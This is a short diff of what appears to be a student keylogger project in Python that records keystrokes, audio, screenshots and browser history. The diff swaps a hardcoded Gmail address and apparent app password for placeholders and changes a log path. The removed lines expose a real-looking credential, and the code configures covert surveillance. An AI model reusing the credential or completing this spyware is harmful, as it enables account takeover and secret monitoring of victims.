@@ -30,9 +30,9 @@ import pyscreenshot
 
 
 keys_information = "log-" + str(date.today()) + ".txt"
-email_address = "lucaschooi99@gmail.com"
-password = "zmtdcaaggseaykhj"
-toaddr = "lucaschooi99@gmail.com"
+email_address = # (Your email address)
+password = # Click manage google account > security > Apps passwords
+toaddr = # (Your email address)
 dt_string = datetime.now().strftime("%d_%m_%Y time-%H_%M_%S")
 audio_information = "audio-" + dt_string + ".wav"
 audio = pyaudio.PyAudio()
@@ -40,7 +40,7 @@ browser_hist = "history.txt"
 
 screenshotcount = 0
 
-file_path = "E:\\FYP1\\Keylogger\\Project"
+file_path = "C:\\Users\\User\\OneDrive\\Desktop"
 extend = "\\"
 
 
